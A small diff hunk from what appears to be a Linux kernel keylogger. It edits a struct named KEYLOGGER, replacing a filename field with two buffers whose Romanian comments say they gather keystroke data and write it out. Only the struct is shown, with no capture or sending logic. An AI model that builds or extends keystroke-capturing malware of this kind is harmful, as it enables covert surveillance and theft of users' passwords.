@@ -13,6 +13,7 @@
     {
         struct notifier_block key_notifier;
         struct work_struct work_struct;
-        char* filename;
+        char* keyboard_read_buffer; //acesta este pt colectarea curenta de date
+        char* write_buffer; //acesta este pentru scrierea datelor colectate in keyboard_read_buffer
     }KEYLOGGER;
 #endif
